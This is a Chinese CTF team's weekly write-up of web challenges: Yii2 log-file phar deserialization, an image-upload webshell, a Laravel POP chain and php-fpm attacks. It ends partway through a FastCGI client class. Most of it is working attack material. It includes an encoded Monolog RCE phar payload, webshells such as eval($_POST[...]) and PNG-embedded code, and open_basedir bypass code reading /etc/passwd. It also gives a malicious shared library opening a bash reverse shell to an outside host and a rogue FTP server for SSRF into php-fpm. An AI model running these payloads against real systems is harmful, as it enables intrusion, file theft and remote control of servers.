

# Nepnep学习报告 web第七周

- 红帽杯 OnePointer PHP 复现
- 蓝帽杯 Ezlight 复现
- 虎符 internal_system 复现
- 国赛 upload, filter 复现

## filter

查看Contoller

```php
public function actionIndex()
{
	$file = Yii::$app->request->get('file');
    $res = file_get_contents($file);
    file_put_contents($file,$res);
    return $this->render('index');
}
```

然后查看配置

```
'log' => [
     'traceLevel' => YII_DEBUG ? 0 : 0,
     'targets' => [
          [
              'class' => 'yii\log\FileTarget',
              'levels' => ['error'],
              'logVars' => [],
          ],
     ],
],
```

提示写log文件, 和 laravel 8 debug 很像, 攻击的方向是 monolog

```
    "require": {
        "php": ">=5.6.0",
        "yiisoft/yii2": "~2.0.14",
        "yiisoft/yii2-bootstrap": "~2.0.0",
        "yiisoft/yii2-swiftmailer": "~2.0.0 || ~2.1.0",
	"monolog/monolog":"1.19"
    },
```

phpggc 找到 RCE 链

```
php -d'phar.readonly=0' ./phpggc Monolog/RCE1 "phpinfo" "1" --phar phar -o php://output | base64 -w0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:].zfill(2) + '=00' for i in sys.stdin.read()]).upper())"
```

制造错误存入log后, 第一步清空字符

```
?file=php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../runtime/logs/app.log
```

第二步写入链子, 后面加个 a 防止生成两条

```
?file==50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=72=00=6E=00=41=00=67=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=51=00=41=00=67=00=41=00=41=00=54=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=46=00=4E=00=35=00=63=00=32=00=78=00=76=00=5A=00=31=00=56=00=6B=00=63=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=32=00=39=00=6A=00=61=00=32=00=56=00=30=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=49=00=35=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=35=00=76=00=62=00=47=00=39=00=6E=00=58=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=4A=00=63=00=51=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=53=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=36=00=4E=00=7A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=79=00=4F=00=54=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=45=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=63=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=79=00=4D=00=6A=00=6F=00=69=00=59=00=32=00=46=00=30=00=49=00=43=00=39=00=55=00=61=00=47=00=6C=00=7A=00=58=00=32=00=6C=00=7A=00=58=00=32=00=5A=00=73=00=59=00=57=00=46=00=68=00=5A=00=32=00=64=00=6E=00=5A=00=79=00=49=00=37=00=63=00=7A=00=6F=00=31=00=4F=00=69=00=4A=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=68=00=62=00=47=00=6C=00=36=00=5A=00=57=00=51=00=69=00=4F=00=32=00=49=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=4D=00=61=00=57=00=31=00=70=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=77=00=63=00=6D=00=39=00=6A=00=5A=00=58=00=4E=00=7A=00=62=00=33=00=4A=00=7A=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=6D=00=4E=00=31=00=63=00=6E=00=4A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=59=00=36=00=49=00=6E=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=49=00=37=00=66=00=58=00=31=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=54=00=61=00=58=00=70=00=6C=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=45=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=49=00=79=00=4F=00=69=00=4A=00=6A=00=59=00=58=00=51=00=67=00=4C=00=31=00=52=00=6F=00=61=00=58=00=4E=00=66=00=61=00=58=00=4E=00=66=00=5A=00=6D=00=78=00=68=00=59=00=57=00=46=00=6E=00=5A=00=32=00=64=00=6E=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=55=00=36=00=49=00=6D=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=31=00=39=00=63=00=7A=00=6F=00=34=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=70=00=62=00=6D=00=6C=00=30=00=61=00=57=00=46=00=73=00=61=00=58=00=70=00=6C=00=5A=00=43=00=49=00=37=00=59=00=6A=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=78=00=70=00=62=00=57=00=6C=00=30=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=42=00=79=00=62=00=32=00=4E=00=6C=00=63=00=33=00=4E=00=76=00=63=00=6E=00=4D=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=33=00=56=00=79=00=63=00=6D=00=56=00=75=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=6F=00=69=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=49=00=6A=00=74=00=39=00=66=00=58=00=30=00=46=00=41=00=41=00=41=00=41=00=5A=00=48=00=56=00=74=00=62=00=58=00=6B=00=45=00=41=00=41=00=41=00=41=00=57=00=66=00=2B=00=73=00=59=00=41=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=49=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=43=00=35=00=30=00=65=00=48=00=51=00=45=00=41=00=41=00=41=00=41=00=57=00=66=00=2B=00=73=00=59=00=41=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=64=00=47=00=56=00=7A=00=64=00=4E=00=71=00=48=00=78=00=43=00=33=00=6B=00=61=00=5A=00=46=00=73=00=77=00=2F=00=31=00=59=00=42=00=78=00=78=00=44=00=70=00=69=00=52=00=4B=00=54=00=4F=00=4B=00=61=00=41=00=67=00=41=00=41=00=41=00=45=00=64=00=43=00=54=00=55=00=49=00=3D=00a
```

第三步清空干扰字符

```
?file=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../runtime/logs/app.log
```

第四步触发 phar 反序列化

```
?file=phar://../runtime/logs/app.log/test.txt
```

在根目录下找到 This_is_flaaagggg 抓取即可

## upload

要求正方形图片，并且不能有`c/i/h/ph` 

```php
<?php
if (!isset($_GET["ctf"])) {
    highlight_file(__FILE__);
    die();
}

if(isset($_GET["ctf"]))
    $ctf = $_GET["ctf"];

if($ctf=="upload") {
    if ($_FILES['postedFile']['size'] > 1024*512) {
        die("这么大个的东西你是想d我吗？");
    }
    $imageinfo = getimagesize($_FILES['postedFile']['tmp_name']);
    if ($imageinfo === FALSE) {
        die("如果不能好好传图片的话就还是不要来打扰我了");
    }
    if ($imageinfo[0] !== 1 && $imageinfo[1] !== 1) {
        die("东西不能方方正正的话就很讨厌");
    }
    $fileName=urldecode($_FILES['postedFile']['name']);
    if(stristr($fileName,"c") || stristr($fileName,"i") || stristr($fileName,"h") || stristr($fileName,"ph")) {
        die("有些东西让你传上去的话那可不得了");
    }
    $imagePath = "image/" . mb_strtolower($fileName);
    if(move_uploaded_file($_FILES["postedFile"]["tmp_name"], $imagePath)) {
        echo "upload success, image at $imagePath";
    } else {
        die("传都没有传上去");
    }
}
```

example.php 是一个解压操作, 把zip压缩包解压到tmp目录然后进行裁剪, 裁剪后的图放到example目录下 

```php
<?php
if (!isset($_GET["ctf"])) {
    highlight_file(__FILE__);
    die();
}

if(isset($_GET["ctf"]))
    $ctf = $_GET["ctf"];

if($ctf=="poc") {
    $zip = new \ZipArchive();
    $name_for_zip = "example/" . $_POST["file"];
    if(explode(".",$name_for_zip)[count(explode(".",$name_for_zip))-1]!=="zip") {
        die("要不咱们再看看？");
    }
    if ($zip->open($name_for_zip) !== TRUE) {
        die ("都不能解压呢");
    }

    echo "可以解压，我想想存哪里";
    $pos_for_zip = "/tmp/example/" . md5($_SERVER["REMOTE_ADDR"]);
    $zip->extractTo($pos_for_zip);
    $zip->close();
    unlink($name_for_zip);
    $files = glob("$pos_for_zip/*");
    foreach($files as $file){
        if (is_dir($file)) {
            continue;
        }
        $first = imagecreatefrompng($file);
        $size = min(imagesx($first), imagesy($first));
        $second = imagecrop($first, ['x' => 0, 'y' => 0, 'width' => $size, 'height' => $size]);
        if ($second !== FALSE) {
            $final_name = pathinfo($file)["basename"];
            imagepng($second, 'example/'.$final_name);
            imagedestroy($second);
        }
        imagedestroy($first);
        unlink($file);
    }

}
```

大概思路: 上传zip > 解压出zip里的🐎放入php然后 getshell

文件名用 mb_strtolower()

```
İ => i
```

两种方式把 shell 放在图片中间

1. [PNG-IDAT-Generator](https://github.com/huntergregal/PNG-IDAT-Payload-Generator?fileGuid=gjvJgpcyyhg3xt6r)

2. 使用脚本插入

```php
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0xe, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x1, 0xdc, 0x5a, 0x1, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);
 
$img = imagecreatetruecolor(32, 32);
 
for ($y = 0; $y < sizeof($p); $y += 3) {
$r = $p[$y];
$g = $p[$y+1];
$b = $p[$y+2];
$color = imagecolorallocate($img, $r, $g, $b);
imagesetpixel($img, round($y / 3), 0, $color);
}
 
imagepng($img,"aa.png");
```

3. 使用 1 方法并改进 payload

主要采用了3方法将原有的payload改进, 提取脚本中的16进制

![20210526005233802](D:\safetool\Tools\Web2\github\Rickyweb\Nepnep\Probation\img\20210526005233802.png)

然后放入 png 中修改

![20210526005615353](D:\safetool\Tools\Web2\github\Rickyweb\Nepnep\Probation\img\20210526005615353.png)

反向加密![20210526010859186](D:\safetool\Tools\Web2\github\Rickyweb\Nepnep\Probation\img\20210526010859186.png)

修改后运行 generator.py

![20210526010024282](D:\safetool\Tools\Web2\github\Rickyweb\Nepnep\Probation\img\20210526010024282.png)

得到图片后通过 upload.html 上传

```html
<html>
<body>
    <form action="http://54a1b101-291a-4ef3-b63b-d4c91035b58a.node3.buuoj.cn" method="POST" enctype="multipart/form-data">
        <input type="file" name="postedFile" />
        <input type="submit" />
    </form>
</body>
</html>
```

上传至 image/a.zip

![20210526010317403](D:\safetool\Tools\Web2\github\Rickyweb\Nepnep\Probation\img\20210526010317403.png)

其中考察的知识点

```
<?php
if(mb_strtolower('İ')==='i'){
	echo urlencode('İ');
}
// %C4%B0
?>
```

绕过 getimagesize

```
#define width 1
#define height 1
```

解压时进行目录穿梭

![20210526010410152](D:\safetool\Tools\Web2\github\Rickyweb\Nepnep\Probation\img\20210526010410152.png)

然后访问 /example/a.php, 蚁剑连接, grep搜索 flag

```
grep -rn 'flag{' /etc/*
```

结果

![20210526010701473](D:\safetool\Tools\Web2\github\Rickyweb\Nepnep\Probation\img\20210526010701473.png)

## Ezlight

本质考的是 laravel pop链

主要的文件上传点在 内容管理 > 文章 > 新增文章内容 > 封面图

跟踪到文件 `app/Http/Controllers/Admin/NEditorController.php`

里面的 uploadImage 没有什么危险, 可以上传文件至 upload/image/202105/xxx.gif

但是下面有个 catchImage, 跟踪至 fetchImageFile 函数

![20210526180924195](D:\safetool\Tools\Web2\github\Rickyweb\Nepnep\Probation\img\20210526180924195.png)

可以得知 fetchImageFile 函数可以获取外网的内容

```php
    protected function fetchImageFile($url)
    {
        try {
            if (!filter_var($url, FILTER_VALIDATE_URL)) {
                return false;
            }

            $ch = curl_init();
            $options =  [
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.2 (KHTML, like Gecko) Chrome/22.0.1216.0 Safari/537.2'
            ];
            curl_setopt_array($ch, $options);
            $data = curl_exec($ch);  # curl_exec
            curl_close($ch);
            ...
```

然后生成的 data 进入`vendor/intervention/image/src/Intervention/Image/AbstractDriver.php`

![20210526182603897](D:\safetool\Tools\Web2\github\Rickyweb\Nepnep\Probation\img\20210526182603897.png)

在此进入 `vendor/intervention/image/src/Intervention/Image/AbstractDecoder.php`

```php
    public function isUrl()
    {
        return (bool) filter_var($this->data, FILTER_VALIDATE_URL);
    }
```

只是判断是否为 url, 所以可以传入 phar 协议, 最终进入 file_get_contents 触发反序列化

![20210526182646747](D:\safetool\Tools\Web2\github\Rickyweb\Nepnep\Probation\img\20210526182646747.png)

然后使用 laravel 7 的pop链即可攻击, 这里用的我自己挖的文件上传链打, 把上传路径设置对即可

```php
<?php

/*
# -*- coding: utf-8 -*-
# @filename: laravel 7 RCE poc5
# @author: Ricky
# @ability: upload shell
*/

namespace Illuminate\Broadcasting {
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct($events) {
            $this->events = $events;
        }
    }
}

namespace Illuminate\Notifications
{
    class ChannelManager
    {
        protected $container;
        protected $defaultChannel;
        protected $customCreators;

        function __construct($function, $parameter)
        {
            $this->container = $parameter;
            $this->customCreators = ['x' => $function];
            $this->defaultChannel = 'x';
        }
    }
}

namespace Illuminate\Filesystem {
    class Filesystem{
        public $path = './public/ricky.php';
        public $data = '<?php eval($_POST[ricky]);?>';
    }
}

namespace Illuminate\Auth {
    class RequestGuard {
        protected $user;
        protected $callback;
        protected $request = './public/ricky.php';
        protected $provider = '<?php eval($_POST[ricky]);?>';
        public function __construct($callback) {
            $this->callback = $callback;
        }
    }
}

namespace {

    use Illuminate\Auth\RequestGuard;
    use Illuminate\Filesystem\Filesystem;
    use Illuminate\Notifications\ChannelManager;
    use Illuminate\Broadcasting\PendingBroadcast;

    $c = new RequestGuard([new Filesystem(), 'append']);
    $b = new ChannelManager('call_user_func', [$c, 'user']);
    $a = new PendingBroadcast($b);
    $phar = new Phar('phar.phar');
    $phar -> stopBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");
    $phar -> addFromString('test.txt','test');
    $phar -> setMetadata($a);
    $phar -> stopBuffering();
    rename('phar.phar','exp.jpg');
}
```

先通过 `/admin/neditor/serve/uploadimage` 上传图片, 再通过 `/admin/neditor/serve/catchImage` 触发 phar 反序列化, 可以在 public 目录下得到 shell

ps: 公网起一个txt文件(test.txt为例) 写入 phar://./upload/image/xxx.gif 即可

![20210526183712676](D:\safetool\Tools\Web2\github\Rickyweb\Nepnep\Probation\img\20210526183712676.png)

然后一句话木马连接在根目录下找到 flag

## OnePointer PHP

下载源码, 在 `add_api.php `

```
<?php
include "user.php";
if($user=unserialize($_COOKIE["data"])){
	$count[++$user->count]=1;
	if($count[]=1){
		$user->count+=1;
		setcookie("data",serialize($user));
	}else{
		eval($_GET["backdoor"]);
	}
}else{
	$user=new User;
	$user->count=1;
	setcookie("data",serialize($user));
}
?>
```

数组溢出漏洞

```
<?php
class User{
	public $count = 9223372036854775806;
}
$a = new User;
echo serialize($a);
// O:4:"User":1:{s:5:"count";i:9223372036854775806;}
```

通过 backdoor 写马上去连接, 查看 phpinfo 需要绕过 open_basedir 和 disable_function

```php
<?php
if ( $b = opendir('glob:///*') ) {
    while ( ($file = readdir($b)) !== false ) {
        echo $file."<br>";
    }
    closedir($b);
}
?>
```

上传这个 php 文件查看根目录文件, 通过下面这个文件可以读取文件

```
<?php
mkdir('hack');
chdir('hack');
ini_set('open_basedir','..');
chdir('..');chdir('..');chdir('..');
chdir('..');chdir('..');chdir('..');chdir('..');
ini_set('open_basedir','/');
var_dump(file_get_contents("/etc/passwd"));
```

读取 ` /usr/local/etc/php/php.ini `, 可以发现 ` easy_bypass.so `, 需要加载然后 pwn 它, 这个部分等我学会了再补充...

通过 `/proc/self/maps`发现`easy_bypass.so`的路径, 通过 copy 复制到 /var/www/html

```
var_dump(copy("/usr/local/lib/php/extensions/no-debug-non-zts-20190902/easy_bypass.so",'/var/www/html/bypass.so'));
```

### php-fpm 未授权攻击

查看 phpinfo 发现开了 ` FPM/FastCGI  `, 查看 nginx 配置文件 `/etc/nginx/nginx.conf`

```
include /etc/nginx/conf.d/*.conf;
include /etc/nginx/sites-enabled/*;
```

发现特殊的文件包含

```
/etc/nginx/sites-enabled/default
```

读取该文件

```
fastcgi_pass   127.0.0.1:9001;
```

Fastcgi服务端口在9001,  虽然禁止了fsockopen这个函数，但还有一个**pfsockopen** 没被ban, 修改蚁剑插件的文件

```
\antData\plugins\as_bypass_php_disable_functions-master\payload.js
\antData\plugins\as_bypass_php_disable_functions-master\core\php_fpm\index.js
```

将其中的 fsockopen 改为 **pfsockopen** 然后就是在 `\antData\plugins\as_bypass_php_disable_functions-master\core\php_fpm\index.js` 下添加 127.0.0.1:9001, 重启蚁剑后选择即可上传文件, 上传成功后新建链接访问 .antproxy.php, 密码就是之前的shell, 然后访问 /flag 即可

**手写**

在自己的 vps 上写个扩展

```
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

__attribute__ ((__constructor__)) void preload (void){
    system("bash -c 'bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/8888 0>&1'");
}
```

编译

```
gcc shell.c -fPIC -shared -o shell.so
```

在 vps 上使用以下脚本搭建一个恶意的ftp服务器

```
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.bind(('0.0.0.0', 23))
s.listen(1)
conn, addr = s.accept()
conn.send(b'220 welcome\n')
#Service ready for new user.
#Client send anonymous username
#USER anonymous
conn.send(b'331 Please specify the password.\n')
#User name okay, need password.
#Client send anonymous password.
#PASS anonymous
conn.send(b'230 Login successful.\n')
#User logged in, proceed. Logged out if appropriate.
#TYPE I
conn.send(b'200 Switching to Binary mode.\n')
#Size /
conn.send(b'550 Could not get the file size.\n')
#EPSV (1)
conn.send(b'150 ok\n')
#PASV
conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n') #STOR / (2)
conn.send(b'150 Permission denied.\n')
#QUIT
conn.send(b'221 Goodbye.\n')
conn.close()
```

 在 vps 上开启监听

```
nv -lvp 8888
```

执行 php-fpm 脚本

```
<?php
/**
 * Note : Code is released under the GNU LGPL
 *
 * Please do not change the header of this file
 *
 * This library is free software; you can redistribute it and/or modify it under the terms of the GNU
 * Lesser General Public License as published by the Free Software Foundation; either version 2 of
 * the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
 * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 * See the GNU Lesser General Public License for more details.
 */
/**
 * Handles communication with a FastCGI application
 *
 * @author      Pierrick Charron <pierrick@webstart.fr>
 * @version     1.0
 */
class FCGIClient
{
    const VERSION_1            = 1;
    const BEGIN_REQUEST        = 1;
    const ABORT_REQUEST        = 2;
    const END_REQUEST          = 3;
    const PARAMS               = 4;
    const STDIN                = 5;
    const STDOUT               = 6;
    const STDERR               = 7;
    const DATA                 = 8;
    const GET_VALUES           = 9;
    const GET_VALUES_RESULT    = 10;
    const UNKNOWN_TYPE         = 11;
    const MAXTYPE              = self::UNKNOWN_TYPE;
    const RESPONDER            = 1;
    const AUTHORIZER           = 2;
    const FILTER               = 3;
    const REQUEST_COMPLETE     = 0;
    const CANT_MPX_CONN        = 1;
    const OVERLOADED           = 2;
    const UNKNOWN_ROLE         = 3;
    const MAX_CONNS            = 'MAX_CONNS';
    const MAX_REQS             = 'MAX_REQS';
    const MPXS_CONNS           = 'MPXS_CONNS';
    const HEADER_LEN           = 8;
    /**
     * Socket
     * @var Resource
     */
    private $_sock = null;
    /**
     * Host
     * @var String
     */
    private $_host = null;
    /**
     * Port
     * @var Integer
     */
    private $_port = null;
    /**
     * Keep Alive
     * @var Boolean
     */
    private $_keepAlive = false;
    /**
     * Constructor
     *
     * @param String $host Host of the FastCGI application
     * @param Integer $port Port of the FastCGI application
     */
    public function __construct($host, $port = 9001) // and default value for port, just for unixdomain socket
    {
        $this->_host = $host;
        $this->_port = $port;
    }
    /**
     * Define whether or not the FastCGI application should keep the connection
     * alive at the end of a request
     *
     * @param Boolean $b true if the connection should stay alive, false otherwise
     */
    public function setKeepAlive($b)
    {
        $this->_keepAlive = (boolean)$b;
        if (!$this->_keepAlive && $this->_sock) {
            fclose($this->_sock);
        }
    }
    /**
     * Get the keep alive status
     *
     * @return Boolean true if the connection should stay alive, false otherwise
     */
    public function getKeepAlive()
    {
        return $this->_keepAlive;
    }
    /**
     * Create a connection to the FastCGI application
     */
    private function connect()
    {
        if (!$this->_sock) {
            //$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
            $this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);
            if (!$this->_sock) {
                throw new Exception('Unable to connect to FastCGI application');
            }
        }
    }
    /**
     * Build a FastCGI packet
     *
     * @param Integer $type Type of the packet
     * @param String $content Content of the packet
     * @param Integer $requestId RequestId
     */
    private function buildPacket($type, $content, $requestId = 1)
    {
        $clen = strlen($content);
        return chr(self::VERSION_1)         /* version */
            . chr($type)                    /* type */
            . chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
            . chr($requestId & 0xFF)        /* requestIdB0 */
            . chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
            . chr($clen & 0xFF)             /* contentLengthB0 */
            . chr(0)                        /* paddingLength */
            . chr(0)                        /* reserved */
            . $content;                     /* content */
    }
    /**
     * Build an FastCGI Name value pair
     *
     * @param String $name Name
     * @param String $value Value
     * @return String FastCGI Name value pair
     */
    private function buildNvpair($name, $value)
    {
        $nlen = strlen($name);
        $vlen = strlen($value);
        if ($nlen < 128) {
            /* nameLengthB0 */
            $nvpair = chr($nlen);
        } else {
            /* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
            $nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
        }
        if ($vlen < 128) {
            /* valueLengthB0 */
            $nvpair .= chr($vlen);
        } else {
            /* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
            $nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
        }
        /* nameData & valueData */
        return $nvpair . $name . $value;
    }
    /**
     * Read a set of FastCGI Name value pairs
     *
     * @param String $data Data containing the set of FastCGI NVPair
     * @return array of NVPair
     */
    private function readNvpair($data, $length = null)
    {
        $array = array();
        if ($length === null) {
            $length = strlen($data);
        }
        $p = 0;
        while ($p != $length) {
            $nlen = ord($data{$p++});
            if ($nlen >= 128) {
                $nlen = ($nlen & 0x7F << 24);
                $nlen |= (ord($data{$p++}) << 16);
                $nlen |= (ord($data{$p++}) << 8);
                $nlen |= (ord($data{$p++}));
            }
            $vlen = ord($data{$p++});
            if ($vlen >= 128) {
                $vlen = ($nlen & 0x7F << 24);
                $vlen |= (ord($data{$p++}) << 16);
                $vlen |= (ord($data{$p++}) << 8);
                $vlen |= (ord($data{$p++}));
            }
            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
            $p += ($nlen + $vlen);
        }
        return $array;
    }
    /**
     * Decode a FastCGI Packet
     *
     * @param String $data String containing all the packet
     * @return array
     */
    private function decodePacketHeader($data)
    {
        $ret = array();
        $ret['version']       = ord($data{0});
        $ret['type']          = ord($data{1});
        $ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
        $ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
        $ret['paddingLength'] = ord($data{6});
        $ret['reserved']      = ord($data{7});
        return $ret;
    }
    /**
     * Read a FastCGI Packet
     *
     * @return array
     */
    private function readPacket()
    {
        if ($packet = fread($this->_sock, self::HEADER_LEN)) {
            $resp = $this->decodePacketHeader($packet);
            $resp['content'] = '';
            if ($resp['contentLength']) {
                $len  = $resp['contentLength'];
                while ($len && $buf=fread($this->_sock, $len)) {
                    $len -= strlen($buf);
                    $resp['content'] .= $buf;
                }
            }
            if ($resp['paddingLength']) {
                $buf=fread($this->_sock, $resp['paddingLength']);
            }
            return $resp;
        } else {
            return false;
        }
    }
    /**
     * Get Informations on the FastCGI application
     *
     * @param array $requestedInfo information to retrieve
     * @return array
     */
    public function getValues(array $requestedInfo)
    {
        $this->connect();
        $request = '';
        foreach ($requestedInfo as $info) {
            $request .= $this->buildNvpair($info, '');
        }
        fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
        $resp = $this->readPacket();
        if ($resp['type'] == self::GET_VALUES_RESULT) {
            return $this->readNvpair($resp['content'], $resp['length']);
        } else {
            throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
        }
    }
    /**
     * Execute a request to the FastCGI application
     *
